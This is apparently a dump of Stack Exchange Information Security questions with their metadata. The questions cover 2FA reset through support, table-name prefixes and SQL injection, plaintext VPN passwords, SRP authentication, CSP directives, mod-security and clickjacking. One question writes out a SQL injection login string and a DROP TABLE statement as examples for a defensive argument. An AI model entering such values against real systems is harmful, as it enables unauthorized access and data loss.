<p>Now what happened caused a little bit of doubt on the usefulness of my fancy 2FA: The agent asked me for my email address I used to log in to amazon which I told him. Then the agent sent me a pin to to this email address. After I read back this pin to the agent she suggested to disable the entire 2FA so I could log in, do my things and eventually enable 2FA back again.</p>

<p>Is this a plausible attack vector? I am aware that an attacker needs the password for my amazon account and the password to the mail account for this amazon account, which itself might be not trivial but I am a little irritated that without further ado I could remove the second factor from my authentication. No further information like birth date etc was asked.</p>

<p>(Since my email address did not reuse the amazon password (or any password) and it itself uses a 2FA I regard this threat quite low for my situation, but it still somehow feels odd)</p>
","35886","","","","","2017-11-19 04:13:51","Amazon 2FA: Compromising the email leads to compromising 2FA, e.g removing the other factor?","<multi-factor><account-security><social-engineering>","2","0","","","","CC BY-SA 3.0"
"104202","1","104233","","2015-10-30 22:07:08","","8","1538","<p>One of the most common pieces of advice with respect to securing <a href=""https://yoast.com/wordpress-security/"" rel=""nofollow noreferrer"">WordPress</a>, <a href=""https://magento.stackexchange.com/a/57540"">Magento</a>, and other widely-used pieces of software is to add a prefix to database table names or change the default prefix. For example, one frequently hears to change the default <code>wp_</code> prefix for WordPress to something obscure, like <code>1sdf34jSqo8_</code>.</p>

<p>The question I have is this: <strong>Isn't this no more than security by obscurity? And if so, is it a good practice to do it anyway?</strong></p>

<p>The pros and cons that I see to this are:</p>

<p><strong>Advantages:</strong></p>

<ul>
<li>Many SQL injection attacks necessarily have two steps: identify the tables and then do something else. This doesn't prevent attacks like submitting a password like <code>xyz' OR 1=1 --'</code>, but it does prevent, say, a query like <code>DROP TABLE foo</code> actually doing anything, until the attacker somehow learns the table name.</li>
<li>It helps mitigate the nightmare zero-day attack in which there really is a SQLi vulnerability. A little obscurity is helpful in those situations.</li>
<li>It might make it a little easier to intercept and block certain attacks via mod_security or a WAF. For example, if my table prefix is <code>1sdf34jSqo8_</code> and that string shows up in GET or POST data, I'm going to be <em>very</em> suspicious of that request. But then, if the attacker has that string, I'm likely pwned already. Seeing that text from anyone not already authenticated as a superuser is actually probably a direct-to-pager alert, in fact.</li>
<li>It enables installing multiple copies of an application in one database, for those instances in which a host or service provider allows you to have 1 or 2 databases but doesn't limit the number of tables (which has never made sense to me, but I digress). <em><sup>*</sup>This isn't really a security concern, true, but it's a major reason people enable prefixing like this.</em></li>
</ul>

<p><strong>Disadvantages:</strong></p>

<ul>
<li>This is a <strong><em>huge</em></strong> pain to implement as a developer. It means <em>every</em> table reference in your code needs a constant or variable added to the table name. Simple SELECTs are bad enough; schema changes and patches can become real nightmares. This also breaks the ability of many IDEs to do things like autocompletion and spelling checks on SQL statements.</li>
<li>Thanks to the above problems, it's arguably <em>more</em> likely to result in bugs and possible vulnerabilities due to that one time someone on your team wrote a statement like <code>SELECT * FROM {prefix}foo LEFT JOIN bar ...</code> and forgot the prefix somewhere.</li>
<li>It obviously <em>is</em> at least a form of security by obscurity. This leads to sloppiness, overconfidence, etc.</li>
<li>It doesn't solve any problems that prepared statements and whitelisting don't already fix.</li>
</ul>

<p>I think <a href=""https://security.stackexchange.com/a/35398/35405"">the accepted answer to the question ""Is it okay to reveal database's table names?""</a> nicely summarizes my thoughts - you don't lose anything by revealing table names if your database is secure against injection. If there's a breach at another layer, like a successfully uploaded and executed rogue script, then (1) the table prefix will be easy to discover, and (2) you're hosed anyway.</p>

<p><strong>So, the short version of the question:</strong> is this actually something developers should do when creating applications, or is it just a bad practice masquerading as an additional layer of security?</p>

<p><strong>EDIT:</strong> To be clear, I'm not asking whether the end user should go ahead and change the prefixes for, say, a WordPress installation's database. I'm asking whether, when a developer is creating an application that uses a database, the developer should enable this kind of functionality in the first place.</p>
","35405","","-1","","2017-04-13 12:55:08","2015-10-31 09:52:07","Database table name prefixes and security by obscurity","<sql-injection><security-theater><obscurity>","1","0","","","","CC BY-SA 3.0"
"240575","1","","","2020-11-08 12:01:35","","0","24","<p>I recently found out that a VPN service does not hash their customer passwords and I need professional insight on how to deal with this.</p>
<p>Here's how I found out:</p>
<ol>
<li>Bought a subscription on the wrong email address.</li>
<li>Changed the password for that account because the one they provided was weak.</li>
<li>Asked support to change the account's email address.</li>
<li>Support changed my email, which made me receive the following email.</li>
</ol>
<p>I have anonymized the images for obvious reasons.</p>
<p><a href=""https://i.stack.imgur.com/BEFZd.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/BEFZd.png"" alt=""email with evidence"" /></a></p>
<p>You can see that I had generated that exact password earlier that day. I had the console open to check the password length because I already had my suspicions. The length being exactly 30 made me double-check in my password manager.</p>
<p>I sent them an email but they didn't seem to understand what I meant. Looking back, I may have been too pushy about it.</p>
<p>What should I do?</p>
","245364","","6253","","2020-11-08 12:09:10","2020-11-08 12:09:10","Found out that a paid VPN service emails plaintext passwords","<authentication><passwords><hash><vpn><account-security>","0","3","","2020-11-08 12:32:07","","CC BY-SA 4.0"
"171777","1","","","2017-10-20 12:23:04","","1","118","<p>There is a PCI DSS for credit card processing. Does somewhere exist similar requirements for personal data processing, especially in US?</p>
","27580","","98538","","2018-12-14 09:15:39","2018-12-14 09:15:39","Where can I find legal acts (USA) for storing or processing social security number, tax id, driver license?","<legal><storage><social-security-number>","0","1","","","","CC BY-SA 4.0"
"171816","1","171818","","2017-10-20 22:12:55","","13","7648","<p>It's generally recommend to use a unique password for each online service, a random password generator to create them and a password manager to store them. </p>

<p>I've started to replace all my online passwords with this technique, but some sites have certain rules regarding the length of a password. </p>

<p>Unfortunately, sometimes, a website will not be programmed to communicate the number of maximum characters allowed and simply delete the overflow if copied into the password field. Because of this, I've already had some trouble getting control of an account back, since I did not know how many characters were saved as the password. </p>

<p>Is there any specific number of characters that will probably work on most sites/backend programs and that is still considered relatively safe for randomly generated passwords, so that I can just use one password generator length setting for as many sites as possible?</p>
","161844","","","","","2017-10-24 13:50:19","What's the best length for randomly generated passwords? (Security vs. compatibility)","<passwords><password-cracking><password-policy><key-generation><account-security>","4","4","","","","CC BY-SA 3.0"
"104344","1","","","2015-11-02 02:51:26","","4","158","<p>I heard about warrant canaries and thought the idea was interesting. My understanding of what they are is a website or online service publishes a statement periodically that they have not been served a warrant. This way even with a gag order, the act of not publishing something is not infringing it. I hear <a href=""https://law.stackexchange.com/questions/268/is-there-any-legal-theory-behind-warrant-canaries"">warrant canaries don't actually work</a> as a judge would likely find not publishing something to signal a warrant has been served would be in violation of a gag order.</p>

<p>My question is, is there an alternative to a warrant canary that would serve the same purpose (but actually work), that an online set or web service etc. has been ordered to change their behaviour by the government/police/rebels etc.? I'd imagine something Tor or P2P related could be used to spread the message ""hey, we were forced to hand over user information"".</p>

<p>Correct me if any of the above information is wrong; I'm not well versed in law, but do find this idea interesting. </p>
","10714","","-1","","2017-04-13 13:00:24","2016-03-30 14:44:05","Is there any way a website can show it hasn't been ""hijacked"" by the authorities?","<webserver><legal><security-theater>","0","9","0","2015-11-02 13:14:43","","CC BY-SA 3.0"
"171869","1","171873","","2017-10-22 00:37:36","","1","537","<p>I have a smartphone and I use 2FA to log in to several services - bank, github, world of warcraft, etc.</p>

<p>If I were ever to lose/destroy my phone without making prior arrangements for account recovery it would be, at a minimum, a major hassle to get my new phone linked to my 2FA accounts.</p>

<p>And that's if the service even allows it -- i believe github's policy is if you use 2FA and lose your phone, and you haven't previously downloaded a list of emergency account recovery codes, you're screwed.</p>

<p>Why is it this way?  If I get a new phone and the number is the same, why isn't that enough?</p>
","118477","","118477","","2017-10-22 02:15:56","2021-04-17 20:52:09","Why must I register a new phone for 2FA services? The number is the same, isn't that enough?","<multi-factor><account-security><smartphone>","1","0","","","","CC BY-SA 3.0"
"171871","1","","","2017-10-22 02:15:21","","2","1337","<p>According to <a href=""http://www.wiremoons.com/posts/2014-12-09-Three-Letter-Word-Passwords/"" rel=""nofollow noreferrer"">this</a>, a password such as <em>dinwryran</em> is secure against a brute-force attack. Is this true? If not, why?</p>
","161908","","","","","2017-10-23 04:34:50","How secure is a password made up of three or four three-letter words?","<passwords><brute-force><account-security><passphrase>","3","1","","","","CC BY-SA 3.0"
"240787","1","","","2020-11-13 20:25:05","","0","78","<p>What is the most secure way to automatically connect my remote server via OpenVPN to my home network for running a script?</p>
<p>The plan is I want to automatically backup some folders to my Synology NAS at certain times. I assume saving the VPN username and password in a file is one of the worst ways, but on the other hand PKA is basically the same, since if someone gets access to my server, they either have username and password or my private key? Please correct me if I'm wrong.</p>
","245601","","","","","2020-11-13 20:25:05","Most secure way to authenticate VPN via script for connection from remote server to home network?","<vpn><account-security>","0","3","","","","CC BY-SA 4.0"
"240815","1","","","2020-11-14 18:33:10","","0","97","<p>In the recent past I have been a victim of virus/malware attacks on my home computer running Windows 10 (Home), since I used the same account with high access rights to also browse the internet. However, to mitigate the risks I have upgraded to Windows 10 (Professional) and have also created a <strong>standard-user</strong> specifically for internet browsing with the intention to secure internet access and shield against virus/malware attacks etc on my computer.</p>
<p>So, I intend to be cognizant about what permissions should I set for this new &quot;standard&quot;-user (e.g. file-security permissions, read/write/control file/resource access etc) to browse the internet safely and prevent virus/malware from modifying files, accessing resources or writing itself on my computer. (BTW, It should still allow the user to browse the internet).</p>
<p>Can anyone please point me in the right direction and provide steps/best practices for security on Windows? E.g. deny/allow access to files/resources specifically, other security settings that should be enabled, for safe internet browsing on my computer running Windows 10 (Professional)? Also, kindly let me know which antivirus or any other apps is better suited for home computers.</p>
<p>I understand that this question is very wide and open-ended, but, still if someone could provide some basic ideas like which files to restrict access to, general allow/deny permissions, common security settings etc that could protect my desktop.</p>
<p>Kindly let me know if additional information is required.</p>
","245681","","71850","","2020-11-14 21:13:47","2020-11-14 22:41:11","Permissions to set for Secure internet browsing in Windows 10 (Pro)","<account-security><windows-10><windows-permissions>","1","0","","","","CC BY-SA 4.0"
"172031","1","","","2017-10-24 11:36:35","","3","73","<p>I was reverse engineering our school's commercial grading system backend with chrome dev tools observing the GET requests. My intent was to code a nice app, just for me to learn more about this etc. </p>

<p>I have come to discover that you can see any student's information by just POSTing to the server with their student id information, which is included in every student's email. And our school's email address book is easily visible. The really bad thing about this is that the request returns the student's social security number as well. How would I go about disclosing this to the vendor and the school?</p>
","162095","","6253","","2017-10-24 12:24:59","2017-10-24 12:24:59","What would be the responsible way of disclosing this “exploit”?","<account-security><disclosure>","0","8","","2017-10-24 12:25:56","","CC BY-SA 3.0"
"172054","1","172058","","2017-10-24 15:59:59","","1","125","<p>I'm seeing two different types of authentication being widely used, with one being far more complex than the other. One are the simple session ID tokens used in most websites (user sends login info, receives a token, and passes that token with every future request as authorization). The other is the HMAC signing used in some APIs (uses public/private keys for message encoding).</p>

<p>From the outside, the HMAC method looks far more secure. Messages can't be forged or duplicated, you know the message is always authentic. However it requires a lot more work to package up and sign every request, and requires a way for the client to gain access to the public/private keys to use for signing.</p>

<p>By contract, tokens have been around a long time, and appear to be relatively secure if used properly (only transmit over SSL, pass back a new token with each server response, record the last token used, etc.), and they don't require any key handling.</p>

<p>So why does HMAC signing exist on the web? Are there scenarios that simple session tokens can't protect against? If so, why are tokens still in use?</p>

<p>Tokens are a lot easier to design a thin client around when I don't have to find a way to pass keys around, but I also don't want to shoot myself in the foot by overlooking any inherent security holes.</p>
","24409","","","","","2017-10-24 17:40:16","Security difference between web tokens and message signing","<session-management><web-service><hmac><account-security>","1","0","","","","CC BY-SA 3.0"
"240871","1","","","2020-11-16 17:08:29","","2","317","<ol>
<li><p><a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options"" rel=""nofollow noreferrer"">X-Frame-Options</a> HTTP header is used to tell if a webpage is allowed to be used in a frame/iframe.</p>
</li>
<li><p>Frames can be used for <a href=""https://en.wikipedia.org/wiki/Clickjacking"" rel=""nofollow noreferrer"">click-jacking</a>/UI-redress attacks.</p>
</li>
<li><p>It is advised to set X-Frame-Options to 'DENY' to prevent page being used for click-jacking.</p>
</li>
</ol>
<p>But, is it not possible for the attacker to tamper the headers (especially with no SSL) OR provide his own page-that-mimicks-the-original-page into the frame?</p>
<p>Maybe it is useful when the user is logged in to the original site and the attacker's frame displays a personalized page from the original site to convince the user. But, I suppose a dedicated attacker can mimick that too.</p>
<p>What can you tell about x-frame-options as a security feature and cautions when using it?</p>
","245756","","","","","2020-11-16 17:08:29","How good can X-Frame-Options HTTP header do against click-jacking?","<tls><attacks><account-security><attack-prevention><clickjacking>","0","5","","","","CC BY-SA 4.0"
"240876","1","240882","","2020-11-16 19:36:35","","0","2304","<p>I don't have an instagram account, but I always look to my friends' profiles on instagram or mystalk and see their stories.</p>
<p>BTW my google account is always signed in when I check their stories on instagram or mystalk. So my question is: <strong>in what cases they will know that I see their stories?</strong> For example, can they know (from my google account) that it is me?</p>
","245765","","","","","2020-11-16 21:22:12","In what cases people know that I see their stories on instagram or mystalk?","<account-security><access-control><internet><instagram>","1","0","","2020-11-25 11:18:49","","CC BY-SA 4.0"
"172154","1","172376","","2017-10-25 18:01:23","","4","416","<p>For a new website (HTTPS with HSTS+HPKP), we would like to restrict login access only on authorized user's devices. For that, there is a WebCrypto ECDSA public/private keys generated on each new device. The server store the public key of the new device and return a device ID. The browser save in an IndexedDB named « device » the private key (not extractable) and the device ID.</p>

<p>When the user register his account or want to authorize a new device, we ask him a password for this device, but we don't want to save his password in server database.</p>

<ul>
<li><p>We could use SRP protocol and send the salt &amp; « verifier » to the server, but rather using the user password, we use a derivated password (WebCrypto PBKDF2 or Argon2 library)</p></li>
<li><p>Or we could use WebCrypto again to create new ECDSA keys, specific for this user on this device, and send the public key on the server. On the browser, we store in an IndexedDB named « base64(SHA-256(login) » this user private key but encrypted (wrapKey function) with AES-GCM algorithm and for the key we use the user password derivation (WebCrypto PBKDF2 or Argon2 external library). Then to login, the server send a challenge, a simple random string, the client return the signature of this challenge with this new user specific private key (so he need to known the good password to unwrap the key).</p></li>
</ul>

<p>If our DataBase is leaked:</p>

<ul>
<li><p>With SRP, the verifier can't permit to guess easily the user password, but I suppose we need to ask a new password to all our users.</p></li>
<li><p>With WebCrypto, it's only a public key. Users don't need to change their password. EDIT: A downside is it's possible to do multiple passwords check on the client side, for example if I known my victim I could try may be 1000 possible passwords on the JS Console to unwrap the user private key, without the need to contact the server.</p></li>
</ul>

<p>Of course, if the IndexedDBs are deleted on the browser, this require for the user to start a process to recover his account (private question, OTP by email, whatever... it's not the subject), but this is not specific to the WebCrypto option, it's also happend for the SRP option because we need to detect the device ID and check their signature to be sure it's a device authorized by the user.</p>

<p>Just for information, we also add U2F after this first authentification challenge.</p>

<p>In my specific case, do you recommend to use SRP challenge or this WebCrypto challenge please?</p>
","159165","","159165","","2017-10-26 08:28:43","2017-10-28 11:47:48","SRP or WebCrypto challenge?","<account-security><srp>","1","2","","","","CC BY-SA 3.0"
"241069","1","","","2020-11-20 12:30:58","","2","293","<p>I have recently been reading about reverse tabnabbing, where a child window can change the url of the parent window if it has access to <code>window.opener</code> (which it has by default unless you explicitly disallow it)</p>
<p>In this case the phishing attack is to change the parent tab url and present a similar UI as some trusted website to get user credentials and assume that user might not be able to notice that the url has changed.</p>
<p>I would like to understand why can't this happen in the child window itself ? Agreed that attention wise there are more chances that user would pay less attention to the parent window after the child window is opened, but after sometime, when the user has not been looking at either of the tabs, wouldn't it be similar to just change the url of the child window instead of the parent window ?</p>
<p>Are there any other security concerns that do not allow this?</p>
","207556","","","","","2020-11-27 11:46:08","Reverse tabnabbing: why not redirect the user in the new tab itself instead of the parent tab?","<web-browser><content-security-policy>","2","18","","","","CC BY-SA 4.0"
"241153","1","","","2020-11-22 15:38:28","","2","245","<p>On my WordPress websites (on LEMP stack with Nginx) I normally install a WAF plugin such as Ninja Firewall or Wordfence.</p>
<p>I was wondering if a better practice would be to replace them with a host-based WAF like mod-security (I guess that running both wouldn't be recommended...).</p>
","246101","","246101","","2020-11-22 18:30:58","2020-11-22 18:30:58","Mod-security and WordPress WAF","<wordpress><waf><mod-security>","0","4","","","","CC BY-SA 4.0"
"32249","1","32263","","2013-03-08 08:57:19","","2","823","<p>I am working mostly on C/C++ based enterprise applications. Now few modules are migrating to Java. Also in parallel, there has been stress on ensuring that the application has highest benchmark with respect to security.  </p>

<p>Now, My question is - </p>

<p>Suppose same application is developed in all 3 languages (C/C++/Java), What are the possible areas of language specific security threats? (Like for example <code>const string</code> will be revealed in name mangaling. which can be possible security threat).   </p>

<p>Any links would help me a lot.</p>
","21571","","","","","2013-03-11 11:57:34","programming language and security threats","<security-theater><architecture>","3","1","","","","CC BY-SA 3.0"
"241215","1","","","2020-11-24 09:59:51","","1","262","<p>I am working with a form that a user can fill out to send an e-mail. As part of the form, there is a preview button that shows the user a preview of how the mail will look in a new tab in the browser. The e-mail template itself is defined in a 3rd party service. The site the form is on is protected with a log-in.</p>
<p>When the user clicks the preview button, this happens:</p>
<ol>
<li>The template is fetched from the 3rd party service on the web server.</li>
<li>Information from the form is HTML encoded and added to the template on the web server.</li>
<li>The template is returned as HTML to the user's browser, where it is displayed in a new tab. The new tab contains <em>only</em> the e-mail template, since the template has it's own complete markup.</li>
</ol>
<p>The challenge with this is that the template comes with inline styling, which violates the CSP, but which we need to show a correct preview of the template. To mitigate the risks of specifying <code>style-src 'unsafe-inline';</code> in the CSP header, I've added that rule <em>only</em> to the URL serving the template. This is the complete CSP header for the template preview page:</p>
<pre><code>Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; img-src 'self' https://some-domain-we-load-images.from;
</code></pre>
<p>Since it <a href=""https://stackoverflow.com/questions/476276/using-javascript-in-css#answer-482088"">might be possible to execute JavaScript from CSS</a>, <a href=""https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html"" rel=""nofollow noreferrer"">exfiltrate data with CSS</a>, as well as perform other exploits, I still feel uneasy about this. Maybe an option could be to generate nonces for the CSS, but I am not sure if that works for inline CSS attributes. I've done some testing, and it seems that <code>default-src</code> blocks a lot of attack vectors, but my knowledge in this area is incomplete. Also, according to <a href=""https://developers.google.com/web/fundamentals/security/csp?utm_source=devtools#policy_applies_to_a_wide_variety_of_resources"" rel=""nofollow noreferrer"">Google</a>, there's a few CSP resource directives that doesn't use <code>default-src</code> as a fallback, and it's these:</p>
<ul>
<li>base-uri</li>
<li>form-action</li>
<li>frame-ancestors</li>
<li>plugin-types</li>
<li>report-uri</li>
<li>sandbox</li>
</ul>
<p>I'm unsure if not specifying these will cause any real implications, give that the e-email template preview page is very limited in what it does.</p>
<p>The way I see it, an attacker could inject CSS in one of the following ways:</p>
<ul>
<li>From the form fields. They are all HTML encoded before added to the HTML.</li>
<li>In the 3rd party service, but they would need the login credentials, or exploit some vulnerability with the service.</li>
</ul>
<p>Is there any way to safely render inline styling in HTML from a trusted 3rd party domain? I am starting to lean towards not rendering the template as a preview, but instead sending an actual e-mail to the user so they can preview it that way.</p>
<p>Since the preview page contains only the previewed template, there isn't sensitive information on the page (unless the user enters some in the form, which is not quite what this form is intended for). An attacker might be able to get away with cookies, but there's probably sides to this I don't know about.</p>
<p>And of course, there's also the cost/benefit aspect of this.</p>
","221422","","","","","2020-11-24 09:59:51","Safely render HTML template with inline CSS from trusted domain (it forces the use of ""style-src: unsafe-inline"" in CSP)","<xss><content-security-policy>","0","3","","","","CC BY-SA 4.0"
"172400","1","172409","","2017-10-28 22:59:56","","1","613","<p>I manage an open-source software project that relies on data that I am happy to share with the public. The software is hosted on github.com, but the dataset is too large to host there. It is easiest to keep the dataset in the form of a relational database, currently stored on a PostgreSQL server in my university lab. I'm assuming it would be considered bad practice to create a read-only ""guest"" user account on my PostgreSQL server and publish the credentials along with the software. Is that true? If so, why? And can you suggest a secure way to share a relational database with the public?</p>

<p>My alternative is probably to setup an HTTP server that either delivers standardized results from particular RESTful endpoints, or accepts ad hoc queries for the database (I assume the latter is also a bad idea). But I'd like to get a good idea of why I should do that before going down that path.</p>
","162514","","","","","2017-10-29 07:56:34","Public guest user for PostgreSQL?","<databases><rest><account-security><opensource><postgresql>","1","2","","","","CC BY-SA 3.0"
"172435","1","","","2017-10-29 19:27:50","","1","179","<p>We working on a new website we would like to use SRP protocol. So the salt and verifier are sent to the server, and in theory the server store them like that in a database.
If the DB is leaked, attacker could surely brute-force a user password and check with the verifier/salt (even with a good KDF like Argon2).
We would like to prevent this, there is a recommended solution please?</p>

<p>My current solution:</p>

<p>On RESTful service start, a master password is manually inputted, then hashed with Argon2 multiple time (XOR each password's byte to get the number, up to 255). This master password hash is used to encrypt any sensitive information with AES-GCM before storing them in the DB (salt, SRP verifier).</p>

<p>With this method, if the DB is leaked, even with source code or harddrive, the attacker can't exploit SRP verifier. The only attack I have in mind, would be to install a rootkit and to dump memory to found the master password.</p>
","159165","","159165","","2017-10-30 08:18:47","2017-10-31 11:35:11","There is a recommanded solution to protect SRP verifier to be used if the DB is leaked?","<account-security><rootkits><srp>","1","5","","","","CC BY-SA 3.0"
"172485","1","172958","","2017-10-30 15:01:33","","5","1771","<p>Right now, I maintain the Content-Security-Policy for <a href=""https://www.lidl.de"" rel=""nofollow noreferrer"">https://www.lidl.de</a>, which is:</p>

<pre><code>Content-Security-Policy: frame-ancestors 'self'; block-all-mixed-content; report-uri https://lidlcsp.report-uri.io/r/default/csp/enforce;
</code></pre>

<p>The part with frame-ancestors is to protect against clickjacking.</p>

<p>When going through the violation reports sent to report-uri.io, the number one is the following,</p>

<pre><code>{
    ""csp-report"": {
        ""blocked-uri"": """",
        ""document-uri"": ""https://www.lidl.de/"",
        ""original-policy"": ""frame-ancestors https://www.lidl.de; block-all-mixed-content; report-uri https://lidlcsp.report-uri.io/r/default/csp/enforce"",
        ""violated-directive"": ""frame-ancestors https://www.lidl.de""
    }
}
</code></pre>

<p>which is sent from Firefox (as report-uri.io shows). I'm puzzled on two things here:</p>

<ol>
<li>Why is this report sent? I can't reproduce it.</li>
<li>Why is the ""original policy"" altered ('self' vs. <a href=""https://www.lidl.de"" rel=""nofollow noreferrer"">https://www.lidl.de</a>)? Does this make any difference?</li>
<li>(<strong>EDIT</strong>) Why is <code>https://www.lidl.de/</code> blocked in the following report? The csp explicitly allows iframes on the same site via <code>'self'</code>.</li>
</ol>

<p><strong>EDIT:</strong>
To make the third question a bit clearer I add another <code>csp-report</code>:</p>

<pre><code>{
    ""csp-report"": {
        ""document-uri"": ""https://www.lidl.de/"",
        ""effective-directive"": ""frame-ancestors"",
        ""original-policy"": ""frame-ancestors 'self'; block-all-mixed-content; report-uri https://lidlcsp.report-uri.io/r/default/csp/enforce;"",
        ""blocked-uri"": ""https://www.lidl.de/""
    }
}
</code></pre>

<p>If you can reproduce the CSP violation or can trigger other violations I would be happy to learn about them.</p>
","70038","","70038","","2017-11-07 06:25:05","2017-11-07 06:25:05","Content-Security-Policy: Getting weird reports with frame-ancestors 'self'","<content-security-policy><clickjacking>","1","0","","","","CC BY-SA 3.0"
"172593","1","172596","","2017-10-31 23:23:03","","-3","240","<p>Which is more likely to occur, and by how much: getting your password stolen, or getting your account hacked by brute-force?</p>
","162786","","98538","","2017-11-01 10:23:03","2017-11-01 16:32:45","Password Stealing vs Account Hacking","<passwords><account-security>","3","2","0","2017-11-01 17:19:33","","CC BY-SA 3.0"
"32427","1","32431","","2013-03-11 16:55:44","","19","1522","<p>We have a vendor who sends us ""secure"" messages. The messages come as an email message that contains a link to an SSL encrypted website that has the real message. There is no username/password on the linked site, or any other form of authentication as far as I can tell. </p>

<p>I'm sure they do this so they can check off a box on some compliance checklist, but I want to know, can this truly be considered secure?</p>

<p>My thinking is that since the link itself is sent in the clear, then it is no different than if they had sent the message in the email in the first place. Any attacker who might be able to gain access to my email, either at rest or in transit, can capture and then visit the link.</p>

<p>So is this secure, and if it is at least at some level, what security problems might it be solving? Are there other security measures, not readily evident, that they could be taking to ensure only the original recipient can use the link?</p>

<hr>

<p>Because several answers have mentioned it. In this case there is no IP address white listing or behind the scenes proxy authentication.</p>

<p>Also, there is an expiration date listed on the link, but it is fairly far in the future.</p>
","3425","","3425","","2013-03-12 12:33:08","2013-03-12 12:33:08","When secure email, is not really secure","<email><security-theater>","6","0","","","","CC BY-SA 3.0"
"172791","1","","","2017-11-03 14:37:28","","7","3096","<p>I was minding my own business, didn't change phone, password, or diet. Then on 3 November 2017 a popup asks for my google password. Is this foul play or just bad googly manners? Should I comply, ignore, or panic?</p>

<p>This question may be similar to the one about the en masse <a href=""https://security.stackexchange.com/q/152252/20266"">Google verification request</a> last February. I thought it might be useful to ask a new question with new verbatim text from the message for search purposes.</p>

<p>I just received this notice on my Samsung S4 Active with Android today, identified by a wrench icon (not shown) in the status bar. It said something about updating my phone number (also not shown).</p>

<blockquote>
  <p>Google</p>
  
  <p>To continue, first verify it's you</p>
  
  <p>Enter your password</p>
</blockquote>

<p><a href=""https://i.stack.imgur.com/Dcrmn.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/Dcrmnl.png"" alt=""Google sign-in.  &quot;To continue, first verify it&#39;s you&quot;""></a></p>

<p>Naturally, an unexpected request for password is cause for concern. When I long-push the home button I see the app identified with a googly logo.</p>

<p><a href=""https://i.stack.imgur.com/9kasN.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/9kasNm.png"" alt=""enter image description here""></a></p>

<p>The <a href=""https://security.stackexchange.com/a/152322/20266"">answer from @LieRyan</a> seems reasonable ""...don't sign in on the password prompt on the notification bar. Instead, go to one of the Google Apps or System settings and trigger the login dialog from there."" But nothing I've tried has triggered a login dialog. E.g. Inbox works without a new login.</p>

<p>My question is, how can I determine whether this is a <strong>phishing request</strong>? I assume the logo on the app can be spoofed by some app I don't remember installing.</p>
","20266","","20266","","2017-11-05 17:50:22","2019-09-05 04:55:39","Android update phone number, ""To continue, first verify it's you""","<android><google><phishing><account-security>","1","7","","","","CC BY-SA 3.0"
"241683","1","","","2020-12-04 00:15:15","","0","110","<p>This may not be the correct place to ask. Forgive me, if it is not.</p>
<p>I bought a computer from ebay second-hand and did not receive activated Windows 10. When I requested a registery key I was sent an invalid one, so the company accepted that I return it to them.</p>
<p>However I had logged in to Windows 10 with my name and using my Microsoft account and when I returned the computer I could find no way of erasing my existence from the computer. I sent a note with the computer to the seller.</p>
<p>I have changed my Microsoft account password but I am concerned that the computer I have returned will still be able to access my own microsoft account, despite that password change.</p>
<p>Since that is also my email password (I use outlook/hotmail) I am deeply concerned and wish now that I had held on to the computer until I had managed to resolve this issue.</p>
<p>I was put under pressure to return it immediately or lose my right to a refund.</p>
<p>I am very worried about this and I ask for some advice or if I have come to the wrong place, then advice on where to find an answer.</p>
<hr />
<p>EDIT after posting.</p>
<p>I have now set up two-stage verification in my Microsoft account and I have also requested Microsoft's 'sign-out' process which will sign me out of all devices and apps within twenty four hours, necessitating signing back in again with the new password. (I am still on a learning curve with this.)</p>
","246761","","246761","","2020-12-04 10:32:17","2020-12-04 10:32:17","Returned computer with Microsoft Account : have I compromised security?","<account-security>","0","2","","","","CC BY-SA 4.0"
"172912","1","173397","","2017-11-06 08:30:30","","4","2256","<p>I have two questions regarding the CSP directive <code>upgrade-insecure-requests</code> which I couldn't answer myself by reading the <a href=""https://w3c.github.io/webappsec-upgrade-insecure-requests/"" rel=""nofollow noreferrer"" title=""specification"">specification</a>.</p>

<ol>
<li>What happens to ressources which can't be upgraded to https (e.g. invalid certificate)? Will they be blocked?</li>
<li>What kind of violations will be reported against the endpoint specified by <code>report-uri</code> in the policy? Just failed upgrades or also successful upgrades?</li>
</ol>
","70038","","","","","2017-11-14 05:22:56","CSP: upgrade-insecure-requests - what happens with https-incompatible ressources?","<tls><content-security-policy>","2","0","","","","CC BY-SA 3.0"
"241985","1","248211","","2020-12-11 02:51:27","","2","335","<p>I'm writing a rule for modsecurity 2.x to match an IP address to those in a file.</p>
<pre><code> SecRule REMOTE_ADDR &quot;@ipMatchFromFile /etc/modsecurity/address_list.txt&quot;
</code></pre>
<p>I understand how this works, I'm just wondering if anyone knows when modsecurity loads that .txt file.
Is it only loaded when the rules first load or can it be dynamically updated?</p>
<p>For instance, if you have a running instance of modsecurity on apache and you modify the address_list.txt file, will the rules pick that up or will you have to reload the apache config?</p>
","247157","","","","","2022-10-04 09:28:06","Can modsecurity 2.x read data from a text file that has been updated?","<mod-security>","1","0","","","","CC BY-SA 4.0"
"242009","1","242012","","2020-12-11 15:28:20","","1","847","<p>If I allow base64 encoded images to load on my website, but I <em><strong>do not have</strong></em> unsafe-eval enabled, nor have I allowed 'inline-script' would my site still be at risk by allowing base64 encoded image data to be painted onto images that might have malicious script inside?</p>
","116104","","","","","2020-12-11 16:20:13","CSP allowing Base64 encoded images without unsafe-eval","<javascript><content-security-policy><image>","1","0","","","","CC BY-SA 4.0"
"242046","1","","","2020-12-12 12:11:55","","1","442","<p>Been given a smart tv that used to be used as display connected to a pc with a HDMI cable, now I'm using it as a display as well, over HDMI too.</p>
<p>I was thinking maybe when connected to a network or inserted an usb into the smart tv it could get infected, but what about when connected over HDMI cable?</p>
<p>As far as I know HDMI only transfers video and audio, but I think theorically it could transfer &quot;raw data&quot;, not sure here, so how come my computer can identify the smart tv, brand and model, if only video and audio is being sent?</p>
<p>Also, how much of a risk would using it be given if one computer has some malware on it?</p>
<p>To clarify, I mean using this TV as a display with one computer at once.</p>
<p>Thanks in advance</p>
","247226","","","","","2020-12-12 19:58:52","Is it possible to get infected when using a smartTV between two computers?","<malware><account-security><smart-tv>","1","0","","","","CC BY-SA 4.0"
"242095","1","242097","","2020-12-13 22:36:35","","2","171","<p>On some internet banking websites, I've seen some CVV input fields that seem strange to me. Here is an example:</p>
<p><a href=""https://i.stack.imgur.com/jxhC3.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/jxhC3.png"" alt=""Example CVV input type that I am referring to"" /></a></p>
<p>The field works as such:</p>
<ol>
<li>You can not input a CVV code using a keyboard.</li>
